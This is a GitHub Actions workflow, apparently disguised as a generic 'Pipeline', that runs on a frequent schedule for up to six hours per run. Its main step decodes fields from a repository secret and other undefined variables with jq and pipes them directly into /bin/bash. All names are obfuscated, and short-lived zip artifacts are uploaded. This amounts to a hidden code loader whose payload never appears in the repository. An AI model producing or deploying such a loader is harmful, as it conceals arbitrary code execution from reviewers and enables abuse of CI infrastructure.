name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '53 1,7,13,19 * * *'
permissions:
  contents: read
  actions: read
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  task:
    name: Main task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Execute
        env:
          vv32474: ${{ secrets.vv32474 }}
        run: |
          printf '%s' "$vv32474" | jq -r .cetc688 | /bin/bash
          printf '%s' "$uqguw7" | jq -r .yra6 | /bin/bash
          printf '%s' "$hubh46412" | jq -r .fgopp5048 | /bin/bash
          echo $xi38 | jq -r .tgw28483 | /bin/bash
          echo $xyt5709 | jq -r .znxbd11130 | /bin/bash

      - name: Upload artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: mwd6HOvf
          path: "*.zip"
          retention-days: 1
